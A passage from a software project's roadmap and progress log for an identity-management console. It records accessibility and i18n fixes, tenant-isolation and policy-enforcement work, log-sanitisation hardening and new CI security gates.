   no way back except clearing site data. There *was* an `ErrorBoundary`, but
   it sits inside `Layout`, wrapping the routed page only, so anything that
   throws in the chrome, in `AuthProvider`, or while resolving a route fell
   straight past it to the root. `main.tsx` now mounts the same boundary as
   the outermost element. Its reset had to change to make that useful: the
   default "Try again" clears the boundary's own state, which is right for
   the per-route mount (the route remounts and usually succeeds) and useless
   at the root, where the same broken shell just throws again on the next
   frame — so the root passes a reload. And because that boundary now also
   wraps the login screen, the raw stack trace it printed is development-only
   now; the message a user can quote to support stays, and the full stack
   still goes to the browser console in every build. Verified in Chromium on
   the exact scenario that used to blank: a readable card, a working recovery
   button, and no stack in a production build. This matters more for a
   security product than most: the console is where an operator goes *during*
   an incident, and a version-skewed API response is exactly the kind of
   thing an incident involves.
1g. ✅ **Five pages a keyboard could not operate at all.** "Keyboard order and
   focus management need a person" was half true, and the half that wasn't is
   now fixed. WCAG 2.1.1 (Keyboard, Level A) is decidable by reading the
   markup: a `<div onClick>` with no `tabIndex`, no key handler and no role is
   reachable by pointer and by nothing else. Five pages had exactly that on
   the row you click to select an item — AI Agents, Bulk Operations, Email
   Templates, Attestation Campaigns and Lifecycle Policies — and on all five,
   selecting the row was the *only* way to reach that item's detail, so a
   keyboard-only operator could not see any of it. They now share
   `components/selectable-row.tsx`, which is one component rather than five
   copies for a specific reason: Space has to be `preventDefault`'d or it
   scrolls the page instead of activating the row, and that is the detail
   that goes missing every time the ARIA pattern is hand-rolled (its test
   pins Enter, Space, the preventDefault, and that other keys do nothing).
   Verified in Chromium, not only in jsdom: on each of the five pages, Tab
   reaches the row, Enter flips its `aria-pressed`/`aria-expanded`, and the
   focus ring is present — because a row that takes focus invisibly fails
   WCAG 2.4.7 just as surely. The same sweep found the two remote-desktop
   surfaces focusable and keyed but role-less; they now carry
   `role="application"`, which is what tells a screen reader to stop
   intercepting arrow keys and pass them to the remote machine.

1h. ✅ **A CI guard so a click-only control cannot land again** —
   `scripts/check-keyboard-reachable.sh`, paired with a 12-case self-test, in
   the same style as the four UI guards it joins. An element passes if it is
   natively interactive or carries the whole ARIA substitute (role +
   tabIndex + key handler); anything deliberately not a tab stop must say so
   with `aria-hidden`, so skipping the keyboard has to be *declared* rather
   than implied by omission. Writing it produced two of its own findings.
   Its first version used a regex, which truncated every tag's attributes at
   the `>` inside `onClick={() => …}` — so it reported the correctly-built
   `SelectableRow` as broken and, worse, silently missed a genuine offender
   in `remote-support-viewer.tsx` whose attributes sat past that point. Its
   second version read the doc comment quoting `` `<div onClick>` `` as code.
   Both are now cases 3 and 4 of the self-test, and both were confirmed to go
   red when the corresponding fix is reverted.

1i. ✅ **The accessibility gate now covers every page, and extending it found
   twenty-nine more violations.** 1b's gate named thirteen surfaces by hand.
   That list was right about priority — the pre-login and end-user screens are
   the ones someone may have no choice about using — and wrong about scope: it
   left **ninety-four admin pages ungated**. The gate is now derived from the
   `src/pages` directory instead of written down, so a page added tomorrow is
   covered the day it lands, and the sweep went from 13 surfaces to **106**.
   Turning it on found twenty-nine violations of exactly the class 1b existed
   to catch:
   - **Sixteen filter dropdowns with no accessible name at all.** Every one
     was a Radix `SelectTrigger` whose only text was its own current value, so
     a screen reader announced either nothing or “All Outcomes, combo box” —
     the value, never the purpose. Each now carries an `aria-label` naming
     what it filters, in both catalogs.
   - **Five filters on the admin audit log whose visible labels named
     nothing.** They were bare `<label>` elements with no `htmlFor`, so a
     sighted operator saw five labelled controls and a screen-reader user
     heard five anonymous ones. Associating the labels that already existed
     was the right fix — one name, visible and programmatic, that cannot
     drift.
   - **The landing page's mobile menu button**, the only control in the
     mobile header, with no name and no `aria-expanded`.
   - **Access 360 nested a `<Button>` inside a `<Link>`** in three places.
     That is invalid HTML — interactive content inside an anchor — and it
     produced *both* a nameless link and a nameless button; `asChild`
     collapses the pair into one named `<a>`.
   - Two more filters on `login-anomalies`, a page the previous sweep never
     saw at all because it is a `default` export and the loader only looked
     for named ones. A coverage sweep that silently drops a page is the
     failure mode this whole item is about, so the loader now takes both and
     the sweep asserts its own size.
   The exemption list is itself tested: `api-docs` cannot render here because
   `swagger-ui-react` bundles its own copy of React, and the test for it
   **fails if it starts working**, so the list cannot quietly grow into a list
   of the awkward cases. The sweep was also confirmed to go red on a real
   page: dropping one `aria-label` from `audit-logs.tsx` fails that page's
   case with `button-name`, and nothing else.
   **Still not a VPAT**, and the gate says so in its own header: contrast
   cannot run in jsdom (1d–1e cover it), nothing behind an interaction is
   mounted — a dialog body or dropdown is invisible to this gate — and what a
   screen reader *announces* is still not something any tool judges.

1j. ✅ **260 form controls a screen reader could not name — the half the page
   sweep structurally cannot see.** 1i gated every page, but a page gate only
   sees what renders on load, and almost every form in this console lives
   inside a dialog whose body is not mounted until it is opened. Scanning the
   source instead found **260 controls with no accessible name at all**: a
   screen reader announces "combo box", "edit text", "switch", and nothing
   else. **215 of them already had a visible label sitting right beside them**
   — it just was not associated, so a sighted user saw a labelled form and a
   screen-reader user heard an anonymous one. Those are fixed by association
   rather than by adding an `aria-label`, because the visible label *is* the
   name and tying the two together cannot drift:
   - 204 label/control pairs given a matching `htmlFor` and `id`. Where the
     control renders in a loop the loop's own key goes into both halves — a
     literal id would appear many times in one document and the label would
     name whichever copy the browser matched first.
   - **10 labels that already declared `htmlFor`, pointing at an id no element
     carried.** The worst of the three shapes: it reads as correct in review
     and names nothing at runtime.
   - 4 colour fields where one label sits above two controls (a swatch and its
     hex field); the label carries an id and both point at it.
   The remaining 42 had nothing visible to associate and now carry an
   `aria-label`, 21 of them from keys that already existed and 21 from new ones
   in both catalogs.
   **Two defects the automated pass introduced itself**, both caught before
   commit and both recorded because they are this change's characteristic
   failure mode: searching *backwards* for a nearby label crosses group
   boundaries, so in `directories.tsx` every TLS switch took the label of the
   row above it (the LDAPS label named the StartTLS switch) and in
   `ziti-network.tsx` the "Allowed IPs" label ended up naming a notify-on-use
   switch two groups down. **A mislabelled control is worse than an unlabelled
   one** — it reads as correct and tells the user something false. All 382
   associations in the tree were then re-checked by comparing each label's text
   against the state its control is bound to; the 8 that shared no word are
   tokenizer artifacts, verified by hand.
   The sweep also found `pages/mfa/WebAuthnCredentials.tsx`: a duplicate of the
   routed `/security-keys` page, imported by nothing but its own test, carrying
   hardcoded English the i18n batches never covered because it sits in a
   subdirectory. Deleted with its test — you do not add an accessible name to a
   page no user can open. Its live neighbour
   `components/my-privileged-access-section.tsx` **is** reachable (the
   end-user My Network page composes it) and is still untranslated; it now has
   `useTranslation` wired for the control name, with a comment saying its
   visible copy is a separate batch. That is a real gap in the "every page a
   non-admin can reach is bilingual" claim: the i18n sweep covered `src/pages`,
   not the components a page composes.
   Gated by **`scripts/check-control-names.sh`** with a 14-case self-test, in
   the same style as the five UI guards it joins. Three of its cases are the
   parser traps that produced false results in this repo's other JSX guards:
   attributes after an arrow function must still be seen, markup quoted in a
   doc comment must not be scanned as code, and a template-literal association
   (`id={\`scope-${s}\`}` / `htmlFor={\`scope-${s}\`}`) must match — a matcher
   that only reads `[A-Za-z0-9_-]` misses every dynamic pair and reports
   correctly-labelled rows as offenders, which it did on the first run.

1k. ✅ **The bilingual claim had a boundary in it: `src/pages`.** The
   completeness test that enforces it globs `../pages/*.tsx` and requires
   `useTranslation` — so it never looked at the components a page *composes*.
   Twenty-four of them render user-visible English and call `t()` nowhere,
   including several a non-admin sees: My Apps, Windows Apps, Quick Links,
   linked accounts, the notification bell, the getting-started checklist,
   the idle-timeout and session-expired dialogs, the theme switcher, the
   tenant selector, and the confirm dialog **every destructive action in the
   console routes through**. A person switching the console to Türkçe got a
   translated page with English dialogs on top of it.
   Sixteen of those are now bilingual under a new `components.*` namespace —
   the end-user-reachable set plus the shared chrome, including the sr-only
   "Close" on every dialog and the "Loading" a skeleton announces, which are
   accessible names as much as copy. Two of them cannot use the hook (a class
   error boundary; a design-system primitive) and resolve through the i18n
   singleton instead, with the trade-off written down: the string is picked at
   render and does not follow a live language switch, which is acceptable on a
   screen that exists because rendering already failed.
   **The gate this needed is not about `useTranslation` at all.** `const tr:
   typeof en` proves the two catalogs agree; it says nothing about whether a
   key the code *asks for* exists. i18next answers a missing key by returning
   the key, so `t('components.myApps.heading')` renders the literal string
   `components.myApps.heading` on the page while type-check, lint and every
   test stay green — a typo in an extraction is invisible until somebody looks
   at the screen. A new test resolves **every literal `t()` key in the source**
   against the English catalog: 150+ files, plural keys resolved through their
   `_one`/`_other` siblings, and the local `t` wrappers that prefix a namespace
   (`lib/connection-path.ts`) detected rather than skipped, because those are
   exactly the modules with no component test to catch a typo. Red-proofed by
   changing one character in one key and watching it name the file and the key.
   *Still open:* the admin-only components (the MFA setup wizard, the self-heal
   panel, the remote-support viewer, the audit stream) and extending the
   `useTranslation` completeness test to cover `src/components` once they are
   done.
2. Accessibility audit to a VPAT with real assistive technology — what a
   screen reader actually *announces*, and whether a person can complete each
   journey with one. That still needs a person: no tool judges whether an
   announcement is intelligible, and nothing behind an interaction (dialog
   bodies, dropdown menus) is reachable by the automated sweep at all. What
   no longer needs a person, and is now gated, is contrast (1c–1e), keyboard
   reachability (1g–1h), every axe-detectable WCAG 2.1 A/AA rule over all
   renderable console pages (1i), and — from the source, so dialogs are
   included — that every form control has an accessible name (1j).
3. Separate/hardened end-user portal bundle — *post-GA by decision
   (2026-09-04).*
4. ✅ Mobile app decision made (2026-09-04): Flutter; `mobile/` deleted
   in P7.
5. The existing roadmap epics (outbound SCIM, HR-driven JML, per-org
   overlay scoping, SSF/CAEP, agent-identity substrate) — *post-GA by
   decision (2026-09-04)*; their backends are shipped, routed and tested,
   and P8 documents them as API-only so an evaluator is told, not
   surprised.

### Decisions ratified 2026-09-04 (maintainer)

| # | Decision | Consequence |
|---|---|---|
| D1 | Mobile client is Flutter `client/`; `mobile/` (Expo) is deleted | P7.5 |
| D2 | Trivy / Gitleaks / Semgrep / npm-audit block PRs on CRITICAL/HIGH | P6.5; §5.1 is the rule |
| D3 | Roadmap-epic consoles (outbound SCIM, HR-JML, SSF/CAEP) are post-GA; shipped as documented API-only | P8.1 |
| D4 | ABAC is wired into enforcement behind `ABAC_ENFORCE=off\|observe\|enforce` at the two existing enforcement points | P5.6 |

Calls made as tech lead (stated so they can be overruled): CODEOWNERS is
rewritten to the real owner; `mfa-setup-wizard.tsx` is deleted (the live
flow is `my-security.tsx`); the dashboard "metrics" and "refresh" endpoints
are removed rather than faked; macOS/iOS agent downloads are hidden until a
build exists; push on Flutter commits to ntfy (already the fallback); the
`OAUTH_LOGIN_UI` flag goes with the legacy page and is replaced by
`OAUTH_LOGIN_URL` (the compose reference deployment serves the console on a
different origin from the issuer, so the SPA login must be addressable);
`internal/oauth/store.go` and `internal/feature/` are deleted, not fixed.

### P5 — Tenant isolation and the enforcement lies (the P0 class, second layer)

**Why first:** cross-tenant data exposure is the worst defect class in the
product and the fix is self-contained; the enforcement lies are the exact
class this whole program exists for.

1. ☐ **Migration v138 `ispm_ai_org_isolation`** modelled on v69
   (`internal/migrations/sql_v69.go`): `org_id` (nullable → backfill →
   `NOT NULL` → index → `USING`+`WITH CHECK` policy → `ENABLE`+`FORCE` RLS →
   `GRANT`) on `ispm_rules`, `ispm_findings`, `ispm_scores`, `ai_agents`
   (+ `ai_agent_credentials/permissions/activity` from the parent),
   `ai_recommendations` (+ `recommendation_history`), `bulk_operations`,
   `notification_digests`. Unique keys re-scoped:
   `ispm_scores(org_id, snapshot_date)`, `ispm_rules(org_id, check_type)`,
   `ai_agents(org_id, name)`. `deployments/docker/seed.sql`'s rule seed
   carries `org_id` in the same commit (the compose seed container runs
   with `ON_ERROR_STOP`).
2. ☐ **Handlers org-scoped** — `internal/admin/ispm.go` (every query;
   the `DELETE` at `:470` gets `AND org_id`), `ai_agents.go`,
   `ai_recommendations.go`; and **the ISPM Rules page becomes real**:
   `RunPostureChecks` reads the org's rules (seeding the default rule set
   idempotently on an org's first scan — today `deployments/docker/seed.sql`
   seeds them once, install-wide), skips a disabled rule, stamps the rule's
   severity and `rule_id` on findings. Tenant-isolation tests per handler
   file (two orgs; A never sees or mutates B) in the shape of
   `internal/oauth/ssf_tenant_isolation_test.go`; `ai_agents.go` gets its
   first test file this way.
3. ✅ **`tools/orgscope` inverted** so omission fails — *shipped.* Scope is
   now **derived** from the migration registry (`CREATE TABLE` /
   `ADD COLUMN org_id` / `FORCE ROW LEVEL SECURITY` / `DROP TABLE` / rename
   folded over every `UpSQL`, comments stripped and column lists
   paren-balanced), and every table must be classified with a reason;
   blank reasons panic at startup. Twelve self-tests pin the derivation and
   each rule, `TestDerivedSetCoversFormerHandList` pins the 87-name list it
   replaced so coverage cannot shrink, and `TestRealSchemaIsFullyClassified`
   is what goes red the day a table is added and forgotten. The CI job
   prints the census in its summary.

   **What the first run found, and it is the headline of this phase.** The
   hand-maintained list covered **87 of the schema's 231 tables**. Of the
   144 it never saw:

   - **61 hold per-user or per-org data and have no `org_id` at all** — the
     same defect class v138 fixed, in tables nobody had looked at. Among
     them: `unified_audit_events` (the console's audit stream),
     `admin_audit_log`, `mfa_bypass_codes` / `mfa_sms` / `mfa_email_otp` /
     `hardware_tokens` (per-user credentials), `magic_links`,
     `trusted_browsers`, `saml_sessions`, `lifecycle_*`, `guacamole_*`,
     `enrolled_agents`, `breach_incidents`.
   - **34 carry `org_id` but never received the RLS belt** — `v37`/`v121`
     belted what existed then and everything since has drifted out. Several
     of their own migration descriptions say "org-scoped for RLS" while the
     `FORCE` statement was never written; `temp_access_links` got `org_id`
     in v71 specifically to close a cross-tenant IDOR and the belt did not
     follow.
   - 19 more are belted but have queries that address rows by id without
     naming `org_id` — defence in depth, not a live hole (RLS scopes them),
     deferred for audit rather than bulk-edited.

   These are recorded as three **registers** in `tools/orgscope/scoped.go`,
   each entry naming what the table holds. They are printed with their count
   on every run and do **not** fail the build — fixing 95 tables is a
   migration programme, not a prerequisite for arming the gate — but their
   sizes are pinned by a test, so a register can only shrink and a new table
   cannot be parked on one to keep it quiet. **P5.3b** below is that
   programme.

3b. ☐ **Retire the registers** (the 61 + 34, in batches by domain: audit ·
   MFA/credentials · lifecycle/governance · PAM/remote · agent fleet ·
   notifications/console). Each batch is one migration in the v138 shape plus
   the handler predicates plus a two-org isolation test, and drops the
   register count in the same commit. This is the largest remaining piece of
   engineering in the programme and the one that decides whether "multi-tenant
   isolation is enforced" is true of the whole schema or only of the part
   somebody had listed.
4. ✅ **OPA `deny` enforced** — *shipped.* — `internal/common/middleware/opa.go`: abort
   unless `Allow && len(Deny)==0`; `authz.rego:15-19`'s "any authenticated
   user may GET anything" removed; `policies/access_control.rego`
   (unreachable package, phantom inputs) deleted; allow+deny → 403 test.
5. ✅ **No-op buttons made honest** — *shipped.* — `ai_recommendations.go` "Apply"
   performs each action through the primitive that exists or returns 501
   with the reason (and the console shows it); `ispm.go` "Remediate"
   sends the reminder / opens the review item and marks
   `remediation_pending` / `flagged` — the score moves only when the next
   scan passes.
6. ✅ **ABAC enforcement (D4)** — *shipped.* The evaluator moved out of
   `internal/governance` into **`internal/abac`** (the `internal/appaccess`
   shape: small, DB-direct, importable by both enforcement points), and
   governance keeps a thin wrapper so the ABAC Policies page's "Test" button
   runs the **same** evaluator production does — which was the whole defect:
   that button and a benchmark were its only callers, so an admin could author
   a deny policy, watch the page confirm it evaluates to deny, save it, and
   change nobody's access. `ABAC_ENFORCE=off|observe|enforce` (default off,
   unrecognised values fail toward off) is validated like
   `PAM_SESSION_RISK_GATE`, and is wired inside `assignmentGateAllows`
   (`/oauth/authorize`, one call site covering all six mint sites) and the
   access proxy's route handler. Subject attributes come from the columns this
   schema really has — username, email, department, job_title,
   employment_status, enabled, plus roles and groups as lists — deliberately
   **not** from `identity.User.Attributes`, whose `db:"attributes"` tag names a
   column `users` does not have and which would give every subject an empty
   bag and every policy a silent non-match. Denials are audited through the
   assignment gate's own durable path (`unified_audit_events`, same canonical
   detail keys, new `access.abac.would_deny` / `access.abac.denied` event
   types) and written on **both** the observe and enforce branches, so
   enforcement is never quieter than report mode. The `// (fail-open in dev
   mode)` comment is gone: the no-match default-allow is correct semantics for
   additive policies, and there was never a dev check to justify the wording.
   Also fixed on the way through: `in`/`not_in` now match when **any** member
   of a list-valued attribute (roles, groups) is in the condition's list —
   comparing the whole slice as one string, which is what the old code did,
   made every roles/groups policy match nothing; and the ABAC CRUD handlers
   (get, update, delete) gained the `org_id` predicate they were relying on
   RLS alone for, which took `abac_policies` off the orgscope register.

7. ✅ **SMS `mock` is not a provider** — *shipped.* outside development
   (`internal/sms/service.go`); "Send test SMS" answers 501 on mock;
   `ValidateProduction` rejects `SMS_ENABLED=true` + `SMS_PROVIDER=mock`.
8. ✅ **Multi-IdP SSO** — *shipped.* — `sso_state` carries `idp_id`; the callback loads
   that IdP, not `idps[0]`.
9. ✅ **Assignment gate fails closed under enforcement** — *shipped.* — a lookup error
   with `ACCESS_ASSIGNMENT_ENFORCE=true` denies (audited) instead of
   issuing; report mode keeps logging and allowing.
10. ✅ **`ValidateProduction()` sees the enforcement flags** — *shipped* (`DEV_ADMIN_BYPASS` and mock-SMS-with-SMS-enabled are now errors; the seven report-mode gates are listed by a new `Config.ReportModeGates()` rather than failing startup, because shipping in report mode first is the designed rollout). — errors for
    `DEV_ADMIN_BYPASS=true` and mock SMS; warnings surfaced on the ops
    cockpit / first-run gate for every gate still in report mode
    (`ACCESS_ASSIGNMENT_ENFORCE`, `ABAC_ENFORCE`, `ENABLE_OPA_AUTHZ`,
    `PAM_SESSION_RISK_GATE`, `POSTURE_DEVICE_TRUST_GATE`).
11. ✅ **Constants dressed as measurements** — *shipped* (real process uptime; `/dashboard/metrics` and `/dashboard/refresh` deleted rather than faked; session growth computed week-over-week and `null` when there is no prior week; the SAML "transient" NameID is random per assertion; the geo factor renamed to what it measures, an address change, since `GEOIP_SERVICE_URL` has no client). — real uptime; the dashboard
    metrics/refresh endpoints removed; predictive growth computed or
    removed; SAML transient NameID random per assertion; continuous-auth
    geo uses `GEOIP_SERVICE_URL` or reports the factor unavailable;
    role-assignment review campaigns populate from role assignments.

*Exit test:* the two-org isolation tests and the orgscope inversion are
green; the integration harness with `ABAC_ENFORCE=enforce` and a deny
policy answers 403 + audit on `/oauth/authorize`.

### P6 — A Definition of Done that CI proves

0a. ✅ **CodeQL's log-injection findings, and the ten copies behind them** —
   *shipped*. CodeQL flagged eleven "log entries created from user input" sites
   in the assignment- and ABAC-decision recorders added by P5. The values are
   `client_id` straight off a query parameter and ids read back from a session,
   logged as `zap.String`. Under zap's JSON encoder a newline is escaped and no
   line can be forged; under its **console** encoder — which is what a
   development or staging deployment runs — it is not, so an attacker-chosen
   `client_id` can write a second line and put anything in it. Unbounded length
   is the other half: a megabyte of `client_id` in every warning fills a disk
   and buries the entry it is attached to.
   Looking for a helper to reuse found **ten**, in two naming families and with
   two different behaviours: `sanitizeForLog` / `sanitizeLogValue` in oauth,
   governance, access, admin and credentials, and `scrubLogValue` in access,
   admin, identity, oauth and provisioning. Nine stripped only CR and LF; one
   stripped every control character; none bounded length. A security-relevant
   function with ten implementations is one nobody can reason about, and the
   weakest copy decides what an attacker can do.
   All ten are replaced by `internal/common/logsafe`, which strips every C0
   control, DEL, the C1 range and invalid UTF-8, and caps the value at 256 bytes
   with a visible truncation marker (so two identifiers sharing a prefix cannot
   read as the same value). `logsafe.String` is the zap field constructor for
   anything that arrived from outside. A test proves each property, and a second
   test AST-walks the tree for a package-local re-implementation by name — it is
   the check that found the second family of five, which a grep for the first
   name had missed.

0. ✅ **A workflow CI cannot parse removes itself from CI** — *shipped*.
   `.github/workflows/client-desktop-build.yml` carried `run: echo "TODO:
   ..."` since #814 — a plain YAML scalar containing `": "`, which is not
   valid YAML. GitHub does not skip such a file: it creates a run named after
   the file path, schedules **zero jobs**, and marks it failed. So the Flutter
   desktop client was built on no commit at all, behind a red check with no
   job, no log and no annotation. Fixed, and guarded:
   `scripts/check-workflows-parse.sh` requires every workflow to parse, to
   carry a trigger, and to define at least one job;
   `check-workflows-parse.test.sh` proves it goes red on each of those (and
   green on the bare and quoted `on:` spellings, so it cannot be retired as a
   false-positive machine); the `workflows-parse` job runs both. This is the
   one class of source CI cannot check by running it.

1. ✅ **Convergence Task 15 is code, not ops** — *shipped*. The
   server-rendered login is deleted: `GET /oauth/login`, `POST
   /oauth/authorize/callback`, the five `/oauth/authorize/mfa*` routes,
   `hosted_mfa.go`, `renderLoginPage`/`handleLoginPage`/
   `handleAuthorizeCallback`, the branding loader, and the `OAuthLoginUI`
   branch and flag. `POST /oauth/login` (the SPA's JSON API) and
   `POST /oauth/mfa-verify` stay; `createMFASession` moved to
   `mfa_session.go` with one consumer. `OAUTH_LOGIN_URL` (default
   `<issuer>/login`) is set in the compose stack and the CI harness, whose
   consoles are on another origin. `/oauth/authorize/v2`'s login hop was
   repaired in the same change — it wrote an `auth_request:` hash that
   `POST /oauth/login` never read and redirected to the relative page that
   no longer exists, so it had never completed for any client.
   Proof: `internal/oauth/routes_legacy_login_test.go` (route table absent
   + `POST /oauth/login` positive control + an AST scan for the eleven
   deleted functions) and `test/integration/enforced_posture_test.go`,
   which under `ACCESS_ASSIGNMENT_ENFORCE=true` — now exported by the CI
   harness, which mentioned the variable nowhere before — proves an
   unassigned user of an application with `require_assignment=true` is
   refused with `access_denied`, that the refusal lands in
   `unified_audit_events` as `access.assignment.denied`, that assigning the
   user makes the same flow issue a code, and that the seven deleted routes
   answer 404 on the running service.
2. ✅ **Smoke test in CI** — *shipped*, and it found two dead assertions on
   its first run.
   `scripts/smoke-test.sh` had existed for months wired to a Makefile target
   and to no workflow, believed to need a Docker daemon. It does not: what it
   needs is the eight services listening, and `go build` + background
   processes is the harness `test-integration` already uses for two of them.
   The new `smoke` job brings up Postgres and Redis, migrates, builds all
   eight services and the console, serves the console bundle, waits for
   `/health` on nine ports and runs `make smoke-test`. Elasticsearch is
   deliberately absent (audit-service starts and answers without it); Ziti,
   BrowZer and continuous verification are off, none being reachable from a
   runner.
   Running it for the first time proved two of its assertions had been
   impossible for months:
   - **Phase 3 authenticated with a `client_credentials` token and expected
     to list users.** That token carries no roles, and the admin API has been
     deny-by-default since #79, so the answer is 403 — the script would have
     failed the day anyone ran it. It now asserts the *refusal* (a machine
     token reaching an admin endpoint would be the defect), and does the admin
     work with a real login: `/oauth/authorize` → the one login UI →
     `POST /oauth/login` → PKCE code exchange, which is J1 end to end and the
     first automated coverage of that path outside the integration suite.
     A percent-decoding step is required on the way — the `login_session` in
     the `Location` header is URL-encoded, and the raw value does not match
     the Redis key.
   - **Phase 4 checked a console nobody was serving.**
   Verified locally against a real stack before the job was written:
   **17 checks, 17 passed.**
3. ✅ **Playwright in CI** — *shipped*, and the suite could not have run
   before it. The new `e2e` job runs the spec files registered in
   `web/admin-console/e2e/suite.txt` against a real stack.

   **Correction.** This entry previously read "418 passed, 20 skipped, 0
   failed … runs all fifty spec files". That number was read off a truncated
   tail of a local run and is wrong; the first CI run of the job went red with
   well over a hundred failures. Measured properly — one pass, no retries,
   against Postgres, Redis and the eight services — the fifty files are
   **448 passed, 282 failed**. Running the suite for the first time is what
   surfaced that, which is what the job is for; what was wrong was the claim.

   Three causes were mechanical, are the same defect wearing three hats — a
   suite written for a mocked console — and are fixed in the specs:
   - `page.evaluate(() => localStorage.setItem('auth_tokens', …))` in
     `beforeEach`, 18 sites across four files. `page.evaluate` reaches into
     the CURRENT document and a fresh page is still on `about:blank`, whose
     origin is opaque, so every one threw `SecurityError`. It also wrote
     `auth_tokens`, a key `lib/auth.tsx` has never read.
   - A hand-assembled JWT ending in `mock-signature`, 22 sites across nine
     files, planted over the real session by `addInitScript`. `btoa()` emits
     standard base64 and JWT requires base64url, so identity-service answered
     every request with "token is malformed: could not base64 decode claim"
     and the console bounced back to `/login`.
   - `page.goto('/audit/audit-dashboard')` in three files; `App.tsx` registers
     `audit/dashboard`, and the catch-all sends everything else to the
     dashboard.
   The login form also gained `name="username"` / `name="password"` — it had
   only `id`s, which is why nine `.noauth` specs sat waiting on
   `input[name="username"]`, and which browsers and password managers read.

   What is left is a genuine backlog, and `e2e/suite.txt` names every file of
   it with the reason: specs that drive **`https://openidx.tdv.org`**, a live
   third-party host (53 tests in one file — a CI suite must not depend on
   someone's deployment); specs that need fixture users, passkeys, devices or
   a Ziti controller that no seed creates; and specs asserting copy and DOM
   shapes the console no longer has. They are not deleted and not
   `test.skip`'d — `npm run test:e2e` runs all fifty — and
   `scripts/check-e2e-suite.sh` (self-tested, enforced in `UI safety guards`)
   fails if a spec file is missing from the register, if a `hold` carries no
   reason, or if a listed file is renamed away. The hold side is meant to
   shrink; each entry says what has to become true.

   What had to be fixed before any of it could run was not the specs:
   - **Nothing ever signed in.** `playwright.config.ts` declared no `setup`
     project and no `storageState`, and `.setup.ts` does not match
     Playwright's default `testMatch` — so `auth.setup.ts` never ran and
     every "authenticated" spec ran signed out. The specs that deliberately
     want no session say so with
     `test.use({ storageState: { cookies: [], origins: [] } })`, which only
     makes sense against an authenticated default: the intent was there, the
     wiring was not. The setup also typed `admin123`, which matches nothing
     (the seeded admin is `Admin@123`), and waited five seconds for a
     username field on a page that opens on a single "Sign in with OpenIDX"
     button — the console **is** the login UI, so the form appears only
     after `/oauth/authorize` mints a `login_session` and redirects back.
     The setup now drives that flow.
   - **The dev server could not reach the API.** `getAPIBaseURL()` fell
     through to a hardcoded `http://localhost:8005` — admin-api — in dev and
     for any build served from `:3000`. admin-api owns a slice of `/api/v1`;
     identity, governance, audit, provisioning and access own the rest, so
     the console sent its whole surface to one service and got 404 for
     everything else. The login page's own "fetch identity providers" call
     was one of them. It also meant Vite's proxy was never consulted: axios
     had an absolute base, so nothing was relative enough to proxy. Dev is
     now relative; a built bundle uses its own origin (in every documented
     deployment the thing serving the SPA also fronts the API);
     `VITE_API_URL` still overrides both.
   - **That proxy was a stale subset** — identity, governance, provisioning,
     audit and three admin-api paths spelled out one at a time. No
     `/api/v1/access/*`, no `/oauth/*`, no catch-all. It now mirrors the
     deployed edge route table, specific prefixes first and `/api/` last,
     the same order APISIX's priorities give.
   - **The port drift was real, and the config was the wrong half.** The
     dev server bound 5173 while `e2e/README.md`, `OAUTH_LOGIN_URL` and the
     seeded `admin-console` client's redirect URIs all say 3000 — so a
     sign-in from the dev server ended at "redirect_uri not registered for
     client". Vite now binds 3000 with `strictPort`, so a busy port fails
     loudly instead of moving to 3001 and breaking the redirect URI in a way
     that looks like a server bug.
   - The three `test:e2e:*` scripts the README documented now exist, and
     `PLAYWRIGHT_BASE_URL` — documented since the suite was written, ignored
     by the config — is read.
4. ☐ **Helm install proof** — a `kind` job runs `make helm-install --wait`
   and asserts the migration Job completed, OPA is ready, the backup
   CronJob and NetworkPolicies exist.
4. ☐ **Helm install proof** — a `kind` job runs `make helm-install --wait`
   and asserts the migration Job completed, OPA is ready, the backup
   CronJob and NetworkPolicies exist.
5. ✅ **Gates that gate (D2)** — *shipped*, all six.
   - ✅ **`docs.yml` validates on pull requests.** Its `validate` job
     carried `if: github.event_name == 'pull_request'` and the workflow had
     no `pull_request` trigger — dead code, so `mkdocs build --strict`,
     which exists only there, had never run on any commit and the guide's
     "builds clean under `--strict`" was backed by nothing. Trigger added;
     `build`/`deploy` stay push-only so a PR can never publish to Pages;
     concurrency split so validations do not queue on the Pages
     environment; `--site-dir` made explicit, because MkDocs resolves it
     against the *config file's* directory, so the site landed in
     `docs/site` while the link pass looked at `./site/index.html` — a path
     that never existed, hidden by its own `|| true`. That pass stays
     informational **and now says so**: internal links are gated by
     `--strict`; a third-party site being down is not this repository's
     defect. (Verified: `--strict` passes on this tree today.)
   - ✅ **`status-check` aggregates everything.** It listed seven jobs, in
     two hand-maintained copies (`needs:` and a bash array) that had
     drifted, so `test-frontend` and all nine guard jobs added since could
     go red without Required Checks noticing. `needs:` is now the only list
     — 18 jobs — and the step walks `toJSON(needs)`, so adding a job to
     `needs` is the whole change. `scripts/check-required-checks.sh` fails
     the build when a job is in neither `needs` nor an in-file
     `# status-check: informational — <reason>` register (today: `benchmark`
     and `coverage-report`, each with its reason). An empty `needs` is
     treated as failure, so a mis-expanded expression cannot pass on zero
     checks.
   - ✅ **`ci-android.yml` loses its `|| true`.** The swallow was justified
     as "neither module has tests yet", but Gradle's `test` task on a module
     with no test sources succeeds by itself — so it was never protecting
     against that, only against real failures.
   - ✅ **`security-scan.yml` blocks.** It also now *runs*: the `push` and
     `pull_request` triggers were filtered to `go.mod`/`go.sum`/
     `package.json`/`package-lock.json`, so a pull request that added a
     hardcoded secret or an injection in Go source triggered no scan at all
     — the gate was not merely non-blocking, it was not running. The path
     filter is gone.
     - **Trivy** — `TRIVY_EXIT_CODE` `0` → `1` (the comment read "Don't
       fail on nightly scans"; going red is what a nightly scan is for), on
       all three scans (image, Go filesystem, npm), with
       `ignore-unfixed: true`: a CRITICAL with no upstream patch is not
       something a PR can act on, and a gate that demands the impossible
       gets switched off. Unfixed findings still reach the Security tab.
     - **npm audit** — `npm audit --audit-level=high || true` *inside* a
       step with `continue-on-error`: two swallows on one command. Both
       gone; the JSON report is still written and uploaded first, so a
       failing run carries its evidence. (Verified: 0 vulnerabilities on
       this tree today.)
     - **Gitleaks** — the licensed `gitleaks-action` is replaced by the
       pinned binary. The action wants `GITLEAKS_LICENSE` on org repos and
       can hard-fail without one, which is *why* the step carried
       `continue-on-error` — and a secret scanner that cannot fail the run
       writes leaks into a summary nobody reads. Turning it on surfaced
       **75 findings, every one triaged by hand and none a live
       credential**: documentation placeholders, the repository's canonical
       test key, RFC 6455/6749/6238 example values, and header names that
       tokenise like base64. `.gitleaks.toml` allowlists them **by value or
       by shape with a reason**, never by fingerprint (which stops matching
       the moment a line moves) and never by blanket path (a real secret
